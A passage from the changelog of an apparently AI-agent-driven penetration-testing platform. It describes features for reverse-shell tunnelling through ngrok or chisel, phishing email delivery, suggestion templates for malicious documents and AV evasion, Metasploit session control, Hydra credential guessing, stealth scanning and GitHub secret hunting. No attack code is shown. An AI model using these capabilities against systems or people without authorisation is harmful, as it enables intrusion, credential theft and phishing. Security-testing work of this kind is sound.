  - TCP tunnel on port 4444 with ngrok API exposed on port 4040
  - `_query_ngrok_tunnel()` utility in `agentic/utils.py` that queries ngrok API, discovers the public TCP endpoint, and resolves the hostname to an IP for targets with limited DNS
  - `get_session_config_prompt()` auto-detects LHOST/LPORT from ngrok when enabled — injects a status banner, dual LHOST/LPORT table (handler vs payload), and enforces REVERSE-only payloads through ngrok
  - `is_session_config_complete()` short-circuits to complete when ngrok tunnel is active
  - `NGROK_AUTHTOKEN` added to `.env.example` and `docker-compose.yml` (kali-sandbox env + port 4040 exposed)
- **Phishing Section in Project Settings** — new `PhishingSection` component with SMTP configuration textarea for per-project email delivery settings
- **Tunnel Provider Dropdown** — replaced the single "Enable ngrok TCP Tunnel" toggle in Agent Behaviour settings with a **Tunnel Provider** dropdown (None / ngrok / chisel). Mutually exclusive — selecting one automatically disables the other
- **Social Engineering Suggestion Templates** — 15 new suggestion buttons in AI Assistant drawer under a pink "Social Engineering" template group (Mail icon), covering payload generation, malicious documents, web delivery, HTA, email phishing, AV evasion, and more
- **Phishing Attack Path Badge** — pink "PHISH" badge with `#ec4899` accent color for phishing sessions in the AI Assistant drawer
- **Prisma Migrations** — `20260228120000_add_ngrok_tunnel` (agentNgrokTunnelEnabled), `20260228130000_add_phishing_smtp_config` (phishingSmtpConfig), and `20260305145750_add_ip_mode` (ipMode, targetIps) database migrations
- **Remote Shells Tab** — new "Remote Shells" tab on the graph dashboard for real-time session management:
  - Unified view of all active Metasploit sessions (meterpreter, shell), background handlers/jobs, and non-MSF listeners (netcat, socat)
  - Sessions auto-detected from the Kali sandbox with 3-second polling and background cache refresh
  - Built-in interactive terminal with command history (arrow keys), session-aware prompts, and auto-scroll
  - Session actions: kill, upgrade shell to meterpreter, stop background jobs
  - Agent busy detection with lock-timeout strategy — session listing always works from cache, interaction retries when lock is available
  - Session-to-chat mapping — each session card shows which AI agent chat session created it
  - Non-MSF session registration when agent creates netcat/socat listeners via `kali_shell`
- **Command Whisperer** — AI-powered NLP-to-command translator in the Remote Shells terminal:
  - Natural language input bar (purple accent) above the terminal command line
  - Describe what you want in plain English → LLM generates the correct command for the current session type (meterpreter vs shell)
  - Uses the project's configured LLM (same model as the AI agent) via a new `/command-whisperer` API endpoint
  - Generated commands auto-fill the terminal input for review — no auto-execution
- **Metasploit Session Persistence** — removed automatic Metasploit restart on new conversations:
  - Removed `start_msf_prewarm` call from WebSocket initialization
  - Removed `sessions -K` soft-reset on first `metasploit_console` use
  - `msf_restart` tool now visible to the AI agent for manual use when a clean state is needed

### Changed

- **Model selector** — now passes `userId` to `/api/models` to fetch models from user-specific DB-stored providers
- **Agent orchestrator** — removed all env-var reads for AI provider keys; keys come exclusively from DB-stored user providers
- **`.env.example`** — stripped of all AI provider keys; now contains only infrastructure variables (NVD, tunneling, database)
- **Conflict detection** — IP-mode projects skip domain conflict checks entirely (tenant-scoped Neo4j constraints make IP overlap safe across projects). Domain-mode conflict detection unchanged
- **HTTP probe scope filtering** — `is_host_in_scope()` reordered to check `allowed_hosts` before `root_domain` scope, fixing IP-mode where the fake root domain caused all real hostnames to be filtered out. Added `input` URL fallback for redirect chains
- **GAU disabled in IP mode** — passive URL archives index by domain, not IP; GAU is automatically skipped when `ip_mode` is active
- **Domain ownership verification** skipped in IP mode — not applicable to IP-based targets
- **Session Config Prompt** — refactored to inject pre-configured payload settings (LHOST/LPORT/ngrok) BEFORE the attack chain workflow, so all attack paths (not just CVE exploit) see payload direction — previously injected only after CVE fallback
- **Agent prompts updated** — phishing, CVE exploit, and post-exploitation prompts now conditionally guide the agent based on which tunnel provider is active (ngrok limitations vs chisel capabilities)
- **Recon: HTTP Probe DNS Fallback** — now probes common non-standard HTTP ports (8080, 8000, 8888, 3000, 5000, 9000) and HTTPS ports (8443, 4443, 9443) when falling back to DNS-only target building, improving coverage when naabu port scan results are empty
- **Recon: Port Scanner SYN→CONNECT Retry** — when SYN scan completes but finds 0 open ports (firewall silently dropping SYN probes), automatically retries with CONNECT scan (full TCP handshake) which works through most firewalls
- **Wiki and documentation** — updated AI Agent Guide, Project Settings Reference, Attack Paths guide, and README with dual tunnel provider documentation

### Fixed

- **Duplicate port in https_ports set** — removed duplicate `443` and stale `8080` from `https_ports` in `build_targets_from_naabu()`

---

## [2.1.0] - 2026-02-27

### Added

- **CypherFix — Automated Vulnerability Remediation Pipeline** — end-to-end system that takes offensive findings from the Neo4j graph and turns them into merged code fixes:
  - **Triage Agent** (`cypherfix_triage/`): AI agent that queries the Neo4j knowledge graph, correlates hundreds of reconnaissance and exploitation findings, deduplicates them, ranks by exploitability and severity, and produces a prioritized remediation plan
  - **CodeFix Agent** (`cypherfix_codefix/`): autonomous code-repair agent that clones the target repository, navigates the codebase with 11 code-aware tools, implements targeted fixes for each triaged vulnerability, and opens a GitHub pull request ready for review and merge
  - Real-time WebSocket streaming for both Triage and CodeFix agents with dedicated hooks (`useCypherFixTriageWS`, `useCypherFixCodeFixWS`)
  - Remediations API (`/api/remediations/`) and hook (`useRemediations`) for persisting and retrieving remediation results
  - CypherFix API routes (`/api/cypherfix/`) for triggering and managing triage and codefix sessions
  - Agent-side API endpoints and orchestrator integration in `api.py` and `orchestrator.py`
- **CypherFix Tab on Graph Page** — new tab (`CypherFixTab/`) in the Graph dashboard providing a dedicated interface to launch triage, review prioritized findings, trigger code fixes, and monitor remediation progress
- **CypherFix Settings Section** — new `CypherFixSettingsSection` in Project Settings for configuring CypherFix parameters (GitHub repo, branch, AI model, triage/codefix behavior)
- **CypherFix Type System** (`cypherfix-types.ts`) — shared TypeScript types for triage results, codefix sessions, remediation records, and WebSocket message protocols
- **Agentic README Documentation** (`readmes/`) — internal documentation for the agentic module

### Changed

- **Global Header** — updated navigation to include CypherFix access point
- **View Tabs** — styling updates to accommodate the new CypherFix tab
- **Project Form** — expanded with CypherFix settings section and updated section exports
- **Hooks barrel export** — updated `hooks/index.ts` with new CypherFix and remediation hooks
- **Prisma Schema** — new fields for CypherFix configuration in the project model
- **Agent Requirements** — new Python dependencies for CypherFix agents
- **Docker Compose** — updated service configuration for CypherFix support
- **README** — version bump to v2.1.0, CypherFix badge added, pipeline description updated

---

## [2.0.0] - 2026-02-22

### Added

- **Project Export & Import** — full project portability via ZIP archives:
  - Export (`GET /api/projects/{id}/export`): streams a ZIP containing project settings, conversation history, Neo4j graph data (nodes + relationships with stable `_exportId` UUIDs), and recon/GVM/GitHub Hunt artifact files
  - Import (`POST /api/projects/import`): restores a project from ZIP under a specified user with domain/subdomain conflict validation, constraint-aware Neo4j import (MERGE for unique-constrained labels, CREATE for unconstrained via APOC), and conversation session ID deduplication
  - Import modal with drag-to-select file picker on the Projects page; Export button on Project Settings page
- **EvoGraph — Dynamic Attack Chain Visualization** — real-time evolutionary graph that updates as agent sessions progress with attack chains:
  - New `chain_graph_writer.py` module replacing the legacy `exploit_writer.py`
  - Five new Neo4j node types: `AttackChain` (session root), `ChainStep` (tool execution), `ChainFinding` (discovered vulnerability/credential/info), `ChainDecision` (phase transition), `ChainFailure` (error/dead-end)
  - Rich relationship model: `CHAIN_TARGETS`, `HAS_STEP`, `NEXT_STEP`, `LED_TO`, `DECISION_PRECEDED`, `PRODUCED`, `FAILED_WITH`, plus bridge relationships to the recon graph (`STEP_TARGETED`, `STEP_EXPLOITED`, `STEP_IDENTIFIED`, `FOUND_ON`, `FINDING_RELATES_CVE`)
  - Visual differentiation on the graph canvas: inactive session chains render grey (orange when selected), active session ring pulses yellow, chain flow particles are static grey
  - Cross-session awareness via `query_prior_chains()`: the agent knows what has already been tried in previous sessions
  - All graph writes are async fire-and-forget (never block the orchestrator loop)
- **Multi-Session System** — parallel attack sessions with full concurrency support:
  - Multiple independent agent sessions per project, each with its own WebSocket connection keyed by `user_id:project_id:session_id`
  - Per-session guidance queues and streaming callbacks (dicts keyed by `session_id`) preventing cross-session interference
  - Central task registry (`_active_tasks`) that survives WebSocket reconnection — agents keep running in the background when users disconnect or switch conversations
  - Connection replacement on reconnect: transfers running task, stop state, and guidance queue seamlessly
  - Metasploit prewarm per session key
- **Chat Persistence & Conversation History** — full message durability and session management:
  - Ordered `asyncio.Queue` + single background worker replacing fire-and-forget `asyncio.create_task()`, ensuring messages are saved with correct `sequenceNum`
  - All message types persisted: thinking, tool_start/complete (with raw output), phase updates, approval/question requests, responses, errors, todos
  - Conversation CRUD API routes: list, get with messages, lookup by session, update, delete
  - ConversationHistory panel in AI Assistant drawer with session title, status badge, phase indicator, iteration count, relative timestamps, and live "agent running" pulsing dot
  - Full state restoration when loading a conversation: chat items, todo lists, pending approval/question state, phase, iteration count
- **Per-Session Graph Controls** — granular visibility management for attack chains on the graph:
  - "Show only this session in graph" toggle button in AI drawer header
  - Sessions popup in the bottom bar with per-chain ON/OFF toggles, plus "All" / "None" bulk controls
  - Session badge showing `visible/total` count
  - Session title display (user's initial message truncated to 30 chars) instead of session ID codes
- **Data Table View** — alternative tabular visualization of the attack surface graph:
  - Graph Map / Data Table view tabs with Lucide icons
  - `@tanstack/react-table` powered table with columns: Type (color-coded), Name, Properties count, In/Out connections, L2/L3 hop counts
  - Global text filter, client-side sorting on all columns, row expansion with full property display
  - Pagination (10/25/50/100 per page) and XLSX Excel export
- **User Selector in Global Header** — switch between users directly from the top bar without navigating away, with two-letter avatar initials, dropdown user list, and "Manage Users" link
- **OpenAI-Compatible Provider** — fifth AI provider supporting any OpenAI API-compatible endpoint (Ollama, LM Studio, vLLM, local proxies) via `OPENAI_COMPAT_BASE_URL` and `OPENAI_COMPAT_API_KEY` env vars, with `openai_compat/` prefix convention for model detection
- **Hydra Credential Testing Attack Path** — dedicated credential testing attack path powered by THC Hydra, replacing Metasploit for credential-guessing operations with significantly higher performance. Supports 50+ protocols (SSH, FTP, RDP, SMB, MySQL, HTTP forms, and more) with configurable threads, timeouts, extra checks, and wordlist strategies. After credentials are discovered, the agent establishes access via `sshpass`, database clients, or protocol-specific tools
- **Unclassified Attack Paths** — agent orchestrator now supports attack paths that don't fit the CVE (MSF) or Hydra Credential Testing categories, with dedicated prompts in `unclassified_prompts.py`
- **GitHub Wiki** — 13-page documentation wiki covering getting started, user management, project creation, graph dashboard, reconnaissance, GVM scanning, GitHub secret hunting, AI agent guide, project settings reference, AI model providers, attack surface graph, data export/import, and troubleshooting

### Changed

- **Agent Orchestrator** — major refactoring: per-session dictionaries for guidance queues and streaming callbacks, central task registry for connection-resilient background tasks, dynamic connection resolution via `ws_manager`
- **Graph Canvas** — new node types (ChainFinding, ChainDecision, ChainFailure) with distinct visual styling, session-aware coloring and particle rendering
- **Graph API** — expanded to return attack chain data with session-level grouping
- **PageBottomBar** — redesigned with session visibility controls, view-mode awareness, and session title display
- **UI Theme Hierarchy** — light mode background layers reorganized (white → gray-50 → gray-100 → gray-200 → gray-300), added `--bg-quaternary` token
- **Global Header** — navigation tabs (Projects/Red Zone) moved to right side, Graph Map/Data Table view tabs added, AI Agent button restyled to crimson, user selector added
- **Node Drawer** — styling improvements, new chain node type support
- **Target Section** — domain, subdomains, and root domain toggle locked in edit mode to prevent graph data inconsistency
- **README** — comprehensive rewrite reflecting v2.0 features

### Removed

- **`exploit_writer.py`** — replaced by `chain_graph_writer.py` with full EvoGraph support
- **`README.METASPLOIT.GUIDE.md`** — removed from agentic module

### Fixed

- **Race condition in chat message persistence** — fire-and-forget `asyncio.create_task()` caused messages to be saved with incorrect `sequenceNum`; replaced with ordered queue + single background worker
- **Race condition in concurrent sessions** — `_guidance_queue` and `_streaming_callback` were single instance variables overwritten by each new session; changed to per-session dictionaries keyed by `session_id`

---

## [1.3.0] - 2026-02-19

### Added

- **Multi-Provider LLM Support** — the agent now supports **4 AI providers** (OpenAI, Anthropic, OpenRouter, AWS Bedrock) with 400+ selectable models. Models are dynamically fetched from each provider's API and cached for 1 hour. Provider is auto-detected via a prefix convention (`openrouter/`, `bedrock/`, `claude-*`, or plain OpenAI)
- **Dynamic Model Selector** — replaced the hardcoded 11-model dropdown with a searchable, provider-grouped model picker in Project Settings. Type to filter across all providers instantly; each model shows name, context window, and pricing info
- **`GET /models` API Endpoint** — new agent endpoint that fetches available models from all configured providers in parallel. Proxied through the webapp at `/api/models`
- **`model_providers.py`** — new provider discovery module with async fetchers for OpenAI, Anthropic, OpenRouter, and AWS Bedrock APIs, with in-memory caching (1h TTL)
- **Stealth Mode** — new per-project toggle that forces the entire pipeline to use only passive and low-noise techniques:
  - Recon: disables Kiterunner and banner grabbing, switches Naabu to CONNECT scan with rate limiting, throttles httpx/Katana/Nuclei, disables DAST and interactsh callbacks
  - Agent: injects stealth rules into the system prompt — only passive/stealthy methods allowed, agent must refuse if stealth is impossible
  - GVM scanning disabled in stealth mode (generates ~50K active probes per target)
- **Stealth Mode UI** — toggle in Target section of Project Settings with description of what it does
- **Kali Sandbox Tooling Expansion** — 15+ new packages installed in the Kali container: `netcat`, `socat`, `rlwrap`, `exploitdb`, `john`, `smbclient`, `sqlmap`, `jq`, `gcc`, `g++`, `make`, `perl`, `go`
- **`kali_shell` MCP Tool** — direct Kali Linux shell command execution, available in all phases
- **`execute_code` MCP Tool** — run custom Python/Bash exploit scripts on the Kali sandbox
- **`msf_restart` MCP Tool** — restart Metasploit RPC daemon when it becomes unresponsive
- **`execute_nmap` MCP Tool** — deep service analysis, OS fingerprinting, NSE scripts (consolidated from previous naabu-only setup)
- **MCP Server Consolidation** — merged curl and naabu servers into a unified `network_recon_server.py`, added dedicated `nmap_server.py`, fixed tool loading race condition
- **Failure Loop Detection** — agent detects 3+ consecutive similar failures and injects a pivot warning to break out of unproductive loops
- **Prompt Token Optimization** — lazy no-module fallback injection (saves ~1.1K tokens), compact formatting for older execution trace steps (full output only for last 5), trimmed rarely-used wordlist tables
- **Metasploit Prewarm** — pre-initializes Metasploit console on agent startup to reduce first-use latency
- **Markdown Report Export** — download the full agent conversation as a formatted Markdown file
- **Hydra Credential Testing & CVE (MSF) Settings** — new Project Settings sections for configuring Hydra credential testing (threads, timeouts, extra checks, wordlist limits) and CVE exploit attack path parameters
- **Node.js Deserialization Guinea Pig** — new test environment for CVE-2017-5941 (node-serialize RCE)
- **Phase Tools Tooltip** — hover on phase badges to see which MCP tools are available in that phase
- **GitHub Secrets Suggestion** — new suggestion button in AI Assistant to leverage discovered GitHub secrets during exploitation

### Changed

- **Agent Orchestrator** — rewritten `_setup_llm()` with 4-way provider detection (OpenAI, Anthropic, OpenRouter via ChatOpenAI + custom base_url, Bedrock via ChatBedrockConverse with lazy import)
- **Model Display** — `formatModelDisplay()` helper cleans up prefixed model names in the AI Assistant badge and markdown export (e.g., `openrouter/meta-llama/llama-4-maverick` → `llama-4-maverick (OR)`)
- **Prompt Architecture** — tool registry extracted into dedicated `tool_registry.py`, attack path prompts (CVE exploit, credential testing, post-exploitation) significantly reworked for better token efficiency and exploitation success rates
- **curl-based Exploitation** — expanded curl-based vulnerability probing and no-module fallback workflows for when Metasploit modules aren't available
- **kali_shell & execute_nuclei** — expanded to all phases (previously restricted)
- **GVM Button** — disabled in stealth mode with tooltip explaining why
- **README** — extensive updates: 4-provider documentation, AI Model Providers section, Kali sandbox tooling tables, new badges (400+ AI Models, Stealth Mode, Full Kill Chain, 30+ Security Tools, 9000+ Vuln Templates, 170K+ NVTs, 180+ Settings), version bump to v1.3.0

---

## [1.2.0] - 2026-02-13

### Added

- **GVM Vulnerability Scanning** — full end-to-end integration of Greenbone Vulnerability Management (GVM/OpenVAS) into the RedAmon pipeline:
  - Python scanner module (`gvm_scan/`) with `GVMScanner` class wrapping the GMP protocol for headless API-based scanning
  - Orchestrator endpoints (`/gvm/{id}/start`, `/gvm/{id}/status`, `/gvm/{id}/stop`, `/gvm/{id}/logs`) with SSE log streaming
  - Webapp API routes, `useGvmStatus` polling hook, `useGvmSSE` streaming hook, toolbar buttons, and log drawer on the Graph page
  - Neo4j graph integration — GVM findings stored as `Vulnerability` nodes (source="gvm") linked to IP/Subdomain via `HAS_VULNERABILITY`, with associated `CVE` nodes
  - JSON result download from the Graph page toolbar
- **GitHub Secret Hunt** — automated secret and credential detection across GitHub organizations and user repositories:
  - Python scanner module (`github_secret_hunt/`) with `GitHubSecretHunter` class supporting 40+ regex patterns for AWS, Azure, GCP, GitHub, Slack, Stripe, database connection strings, CI/CD tokens, cryptographic keys, JWT/Bearer tokens, and more
  - High-entropy string detection via Shannon entropy to catch unknown secret formats
  - Sensitive filename detection (`.env`, `.pem`, `.key`, credentials files, Kubernetes kubeconfig, Terraform tfvars, etc.)
  - Commit history scanning (configurable depth, default 100 commits) and gist scanning
  - Organization member repository enumeration with rate-limit handling and exponential backoff
  - Orchestrator endpoints (`/github-hunt/{id}/start`, `/github-hunt/{id}/status`, `/github-hunt/{id}/stop`, `/github-hunt/{id}/logs`) with SSE log streaming
  - Webapp API routes for start, status, stop, log streaming, and JSON result download
  - `useGithubHuntStatus` polling hook and `useGithubHuntSSE` streaming hook for real-time UI updates
  - Graph page toolbar integration with start/stop button, log drawer, and result download
  - JSON output with statistics (repos scanned, files scanned, commits scanned, gists scanned, secrets found, sensitive files, high-entropy findings)
- **GitHub Hunt Per-Project Settings** — GitHub scan configuration is now configurable per-project via the webapp UI:
  - New "GitHub" section in Project Settings with token, target org/user, and scan options
  - 7 configurable fields: Access Token, Target Organization, Scan Members, Scan Gists, Scan Commits, Max Commits, Output JSON
  - `github_secret_hunt/project_settings.py` mirrors the recon/GVM settings pattern (fetch from webapp API, fallback to defaults)
  - 7 new Prisma schema fields (`github_access_token`, `github_target_org`, `github_scan_members`, `github_scan_gists`, `github_scan_commits`, `github_max_commits`, `github_output_json`)
- **GVM Per-Project Settings** — GVM scan configuration is now configurable per-project via the webapp UI:
  - New "GVM Scan" tab in Project Settings (between Integrations and Agent Behaviour)
  - 5 configurable fields: Scan Profile, Scan Targets Strategy, Task Timeout, Poll Interval, Cleanup After Scan
  - `gvm_scan/project_settings.py` mirrors the recon/agentic settings pattern (fetch from webapp API, fallback to defaults)
  - Defaults served via orchestrator `/defaults` endpoint using `importlib` to avoid module name collision
  - 5 new Prisma schema fields (`gvm_scan_config`, `gvm_scan_targets`, `gvm_task_timeout`, `gvm_poll_interval`, `gvm_cleanup_after_scan`)

### Changed

- **Webapp Dockerfile** — embedded Prisma CLI in the production image; entrypoint now runs `prisma db push` automatically on startup, eliminating the separate `webapp-init` container
- **Dev Compose** — `docker-compose.dev.yml` now runs `prisma db push` before `npm run dev` to ensure schema is always in sync
- **Docker Compose** — removed `webapp-init` service and `webapp_prisma_cache` volume; webapp handles its own schema migration

### Removed

- **`webapp-init` service** — replaced by automatic migration in the webapp entrypoint (both production and dev modes)
- **`gvm_scan/params.py`** — hardcoded GVM settings replaced by per-project `project_settings.py`

---

## [1.1.0] - 2026-02-08

### Added

- **Attack Path System** — agent now supports dynamic attack path selection with two built-in paths:
  - **CVE (MSF)** — automated Metasploit module search, payload configuration, and exploit execution
  - **Hydra Credential Testing** — THC Hydra-based credential guessing with configurable threads, timeouts, extra checks, and wordlist retry strategies
- **Agent Guidance** — send real-time steering messages to the agent while it works, injected into the system prompt before the next reasoning step
- **Agent Stop & Resume** — stop the agent at any point and resume from the last LangGraph checkpoint with full context preserved
- **Project Creation UI** — full frontend project form with all configurable settings sections:
  - Naabu (port scanner), Httpx (HTTP prober), Katana (web crawler), GAU (passive URLs), Kiterunner (API discovery), Nuclei (vulnerability scanner), and agent behavior settings
- **Agent Settings in Frontend** — transferred agent configuration parameters from hardcoded `params.py` to PostgreSQL, editable via webapp UI
- **Metasploit Progress Streaming** — HTTP progress endpoint (port 8013) for real-time MSF command tracking with ANSI escape code cleaning
- **Metasploit Session Auto-Reset** — `msf_restart()` MCP tool for clean msfconsole state; auto-reset on first use per chat session
- **WebSocket Integration** — real-time bidirectional communication between frontend and agent orchestrator
- **Markdown Chat UI** — react-markdown with syntax highlighting for agent chat messages
- **Smart Auto-Scroll** — chat only auto-scrolls when user is at the bottom of the conversation
- **Connection Status Indicator** — color-coded WebSocket connection status (green/red) in the chat interface

### Changed

- **Unified Docker Compose** — replaced per-module `.env` files and `start.sh`/`stop.sh` scripts with a single root `docker-compose.yml` and `docker-compose.dev.yml` for full-stack orchestration
- **Settings Source of Truth** — migrated all recon and agent settings from hardcoded `params.py` to PostgreSQL via Prisma ORM, fetched at runtime via webapp API
- **Recon Pipeline Improvements** — multi-level improvements across all recon modules for reliability and accuracy
- **Orchestrator Model Selection** — fixed model selection logic in the agent orchestrator
- **Frontend Usability** — unified RedAmon primary crimson color (#d32f2f), styled message containers with ghost icons and gradient backgrounds, improved markdown heading and list spacing
- **Environment Configuration** — added root `.env.example` with all required keys; forwarded NVD_API_KEY and Neo4j credentials from recon-orchestrator to spawned containers
- **Webapp Header** — replaced Crosshair icon with custom logo.png image, bumped logo text size

### Fixed

- **Double Approval Dialog** — fixed duplicate approval confirmation with ref-based state tracking
- **Orchestrator Model Selection** — corrected model selection logic when switching between AI providers

---

## [1.0.0] - Initial Release

### Added

- Automated reconnaissance pipeline (6-phase: domain discovery, port scanning, HTTP probing, resource enumeration, vulnerability scanning, MITRE mapping)
- Neo4j graph database with 17 node types and 20+ relationship types
- MCP tool servers (Naabu, Curl, Nuclei, Metasploit)
- LangGraph-based AI agent with ReAct pattern
- Next.js webapp with graph visualization (2D/3D)
- Recon orchestrator with SSE log streaming
- GVM scanner integration (under development)
- Test environments (Apache CVE containers)
